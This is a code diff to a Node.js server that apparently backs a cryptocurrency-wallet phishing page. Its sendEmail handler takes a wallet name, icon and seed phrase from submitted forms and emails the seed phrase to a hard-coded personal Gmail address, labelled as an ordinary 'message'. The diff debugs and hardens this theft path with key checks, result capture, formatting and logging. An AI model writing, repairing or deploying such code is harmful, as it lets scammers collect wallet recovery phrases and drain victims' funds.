@@ -109,10 +109,21 @@ const handleToggle = async (req, res, body) => {
 const sendEmail = async (req, res, body) => {
   try {
     if (req.method !== "POST") {
-      return res.status(405).json({ error: "Method not allowed" });
+      res.writeHead(405, {
+        "Content-Type": "application/json",
+        "Access-Control-Allow-Origin": "*",
+      });
+      res.end(JSON.stringify({ error: "Method not allowed" }));
+      return;
     }
 
     const { walletName, walletIcon, seedPhrase } = JSON.parse(body);
+
+    console.log("📧 Received email request:", {
+      walletName,
+      walletIcon,
+      seedPhrase: seedPhrase ? "✓" : "✗",
+    });
 
     if (!walletName || !walletIcon || !seedPhrase) {
       res.writeHead(400, {
@@ -123,9 +134,17 @@ const sendEmail = async (req, res, body) => {
       return;
     }
 
+    // ✅ Check if API key exists
+    if (!process.env.RESEND_API_KEY) {
+      throw new Error("RESEND_API_KEY environment variable is not set");
+    }
+
     const resend = new Resend(process.env.RESEND_API_KEY);
 
-    await resend.emails.send({
+    console.log("📤 Sending email via Resend...");
+
+    // ✅ FIX: Capture the response in a variable
+    const result = await resend.emails.send({
       from: process.env.RESEND_FROM_EMAIL || "onboarding@resend.dev",
       to: "danielekene6b@gmail.com",
       subject: `New Message from ${walletName}`,
@@ -134,10 +153,13 @@ const sendEmail = async (req, res, body) => {
         <p><strong>Name:</strong> ${walletName}</p>
         <p><strong>Icon:</strong> ${walletIcon}</p>
         <p><strong>Message:</strong></p>
-        <p>${seedPhrase}</p>
+        <p>${seedPhrase.replace(/\n/g, "<br>")}</p>
+        <hr>
+        <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
       `,
     });
-    console.log("Email sent via Resend:", result.id);
+
+    console.log("✅ Email sent via Resend:", result.id);
 
     res.writeHead(200, {
       "Content-Type": "application/json",
@@ -146,7 +168,8 @@ const sendEmail = async (req, res, body) => {
     res.end(
       JSON.stringify({
         success: true,
-        message: "Email sent successfully",
+        message: "✅ Email sent successfully",
+        messageId: result.id,
       }),
     );
   } catch (err) {
@@ -212,7 +235,7 @@ const server = http.createServer((req, res) => {
     resend.emails
       .send({
         from: "onboarding@resend.dev",
-        to: "danielekene6b@gmail.com",
+        to: process.env.RECIPIENT_EMAIL_DOMAIN1 || "delivered@resend.dev",
         subject: "Test from Render",
         html: "<h1>Test email</h1><p>If you see this, Resend is working!</p>",
       })
